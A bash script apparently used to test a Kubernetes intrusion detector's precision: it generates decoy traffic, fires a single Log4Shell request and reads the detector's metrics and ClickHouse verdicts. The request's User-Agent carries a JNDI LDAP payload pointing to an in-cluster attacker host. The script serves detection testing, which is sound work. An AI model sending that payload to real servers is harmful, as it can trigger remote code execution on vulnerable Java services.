#!/usr/bin/env bash
# run-experiment.sh — repeatable confusion-vs-experiment NFR + precision measurement.
#
# Deploys the SPLIT confusion-loadgen (one anchor per pod), scales it, fires ONE
# experiment, then measures dx NFRs over a window and how dx classified the
# confusion (ruled_out vs false-positive) + whether the experiment ruled in.
# Uses the current kubectl context. Terminology: experiment, never "attack".
#
# Usage:  ./run-experiment.sh [EXPERIMENT] [REPLICAS] [WINDOW_S]
#   EXPERIMENT : log4j (default) | react2argo | argocd   (only log4j fires here;
#                others print a manual-fire hint so this script stays self-contained)
#   REPLICAS   : replicas PER confusion variant (recon + fileread). default 25
#   WINDOW_S   : measurement window seconds. default 150
set -uo pipefail
HERE="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
EXP="${1:-log4j}"; REPLICAS="${2:-25}"; WIN="${3:-150}"
LNS="${LOG4J_NS:-log4j-poc}"; HONEY="${DX_NS:-honey}"
CHNS="${CH_NS:-clickhouse}"; CHPOD="${CH_POD:-chi-forensic-soc-db-soc-cluster-0-0-0}"
say(){ echo "[$(date -u +%H:%M:%S)] $*"; }
chq(){ kubectl exec -n "$CHNS" "$CHPOD" -c clickhouse -- clickhouse-client -q "$1" 2>/dev/null; }
snap(){ : > "$1"; for ip in $(kubectl get pod -n "$HONEY" -l app=dx-daemon -o jsonpath='{range .items[*]}{.status.podIP}{"\n"}{end}'); do
  kubectl run m-$RANDOM -n "$HONEY" --image=curlimages/curl:8.7.1 --restart=Never --rm -i --quiet --command -- \
    sh -c "curl -s -m8 http://$ip:9095/metrics" 2>/dev/null >> "$1"; done; }

say "1. deploy split confusion-loadgen + bind (SBoB-first recipe)"
kubectl apply -f "$HERE/confusion-split.yaml" >/dev/null
kubectl -n confusion rollout restart deploy/confusion-recon deploy/confusion-fileread >/dev/null 2>&1
kubectl -n confusion rollout status deploy/confusion-recon --timeout=150s 2>&1 | tail -1
kubectl -n confusion rollout status deploy/confusion-fileread --timeout=150s 2>&1 | tail -1

say "2. scale each variant to $REPLICAS"
kubectl -n confusion scale deploy/confusion-recon deploy/confusion-fileread --replicas="$REPLICAS" >/dev/null 2>&1
kubectl -n confusion rollout status deploy/confusion-recon --timeout=180s 2>&1 | tail -1
kubectl -n confusion rollout status deploy/confusion-fileread --timeout=180s 2>&1 | tail -1
say "   waiting 40s for the confusion to reach steady state"; sleep 40

M0=$(mktemp); M1=$(mktemp); snap "$M0"
say "3. fire ONE $EXP experiment"
case "$EXP" in
  log4j)
    kubectl -n "$LNS" rollout restart deploy/backend >/dev/null 2>&1
    kubectl -n "$LNS" rollout status deploy/backend --timeout=120s >/dev/null 2>&1
    BIP=$(kubectl -n "$LNS" get svc backend -o jsonpath='{.spec.clusterIP}'); BPORT=$(kubectl -n "$LNS" get svc backend -o jsonpath='{.spec.ports[0].port}')
    kubectl -n attacker-ns exec deploy/attacker -- curl -s -m6 \
      -A '${jndi:ldap://attacker.attacker-ns.svc.cluster.local:1389/Payload}' \
      "http://$BIP:$BPORT/api/products" >/dev/null 2>&1 || true ;;
  *) say "   EXPERIMENT=$EXP not auto-fired here — fire it manually now (within the window)";;
esac

say "4. window ${WIN}s"; S=0; while [ "$S" -lt "$WIN" ]; do sleep 10; S=$((S+10)); done
snap "$M1"

say "5. NFRs (dx metrics delta over the window)"
python3 - "$M0" "$M1" <<'PY'
import re,sys
def load(f):
    d={}
    for ln in open(f):
        if ln.startswith('#') or not ln.strip(): continue
        m=re.match(r'^([a-zA-Z0-9_]+)(\{[^}]*\})?\s+([0-9eE.+-]+)$',ln.strip())
        if m: d[m.group(1)]=d.get(m.group(1),0)+float(m.group(3))
    return d
a,b=load(sys.argv[1]),load(sys.argv[2])
D=lambda k:b.get(k,0)-a.get(k,0)
def mean(base):
    c=D(base+'_count'); return (D(base+'_sum')/c*1000 if c else 0),c
print(f"  referrals admitted : {D('dx_referrals_total'):.0f}   deduped {D('dx_referrals_deduped_total'):.0f}   DROPPED {D('dx_referrals_dropped_total'):.0f}")
print(f"  blind {D('dx_blind_total'):.0f}   bench_errors {D('dx_bench_errors_total'):.0f}")
for base,lab in [('dx_time_to_verdict_seconds','time-to-verdict'),('dx_workup_duration_seconds','workup'),('dx_bench_query_duration_seconds','bench-query'),('dx_pivot_escalation_duration_seconds','pivot-escalation')]:
    mn,c=mean(base); print(f"  {lab:18s}: mean={mn:.1f}ms n={c:.0f}")
print(f"  pivot escalations/chains: {D('dx_pivot_escalations_total'):.0f}/{D('dx_pivot_chains_total'):.0f}")
PY

say "6. how dx classified the confusion (the precision result)"
chq "SELECT multiIf(\`condition\`!='', concat('RULED_IN:',\`condition\`), edge_kind) AS outcome, count(DISTINCT requestor_pod) AS pods FROM forensic_db.dx_attack_graph WHERE requestor_pod LIKE 'confusion/%' GROUP BY outcome ORDER BY pods DESC FORMAT PrettyCompactMonoBlock"
say "7. did the experiment rule in? (log4j-poc/backend)"
chq "SELECT \`condition\`, count() edges FROM forensic_db.dx_attack_graph WHERE requestor_pod LIKE '${LNS}/backend%' AND \`condition\`!='' GROUP BY \`condition\` FORMAT PrettyCompactMonoBlock"
rm -f "$M0" "$M1"
say "DONE — experiment=$EXP replicas=$REPLICAS window=${WIN}s"
